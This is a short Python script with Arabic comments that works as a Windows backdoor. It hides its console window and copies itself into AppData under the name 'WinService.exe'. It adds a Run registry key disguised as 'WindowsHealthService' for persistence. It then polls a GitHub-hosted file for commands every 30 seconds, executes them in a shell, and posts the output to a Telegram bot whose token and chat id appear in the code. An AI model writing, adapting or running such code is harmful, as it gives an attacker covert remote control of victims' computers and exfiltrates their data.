import os
import sys
import shutil
import subprocess
import base64
import time
import requests

# إعدادات الصمت
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0

def set_persistence():
    try:
        # 1. تحديد مكان مخفي للنسخة الدائمة (فولدر الـ AppData)
        app_data = os.getenv("APPDATA")
        target_dir = os.path.join(app_data, "WindowsHealth")
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
            
        target_path = os.path.join(target_dir, "WinService.exe")
        
        # 2. نسخ الملف الحالي للمكان الجديد (لو شغال كـ EXE)
        if not os.path.exists(target_path) and ".exe" in sys.executable:
            shutil.copyfile(sys.executable, target_path)
            
            # 3. إضافة مفتاح في الـ Registry للتشغيل مع الـ Startup
            # أمر مشفر للهرب من الفحص
            reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsHealthService" /t REG_SZ /d "{target_path}" /f'
            subprocess.run(reg_cmd, shell=True, startupinfo=si)
    except:
        pass

def beacon_logic():
    # رابط الأوامر الخاص بك على GitHub
    CMD_URL = "https://raw.githubusercontent.com/b1do404/My-Python-Practise/refs/heads/main/test/cmd.txt"
    while True:
        try:
            r = requests.get(f"{CMD_URL}?t={int(time.time())}", timeout=10)
            cmd = r.text.strip()
            if cmd != "sleep":
                # تنفيذ الأمر وإرسال النتيجة لتليجرام
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, startupinfo=si)
                requests.post("https://api.telegram.org/bot8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI/sendMessage", 
                              data={"chat_id": "6012820754", "text": output.decode()})
            time.sleep(30) # نبضة كل 30 ثانية
        except:
            time.sleep(60)

if __name__ == "__main__":
    set_persistence()
    beacon_logic()
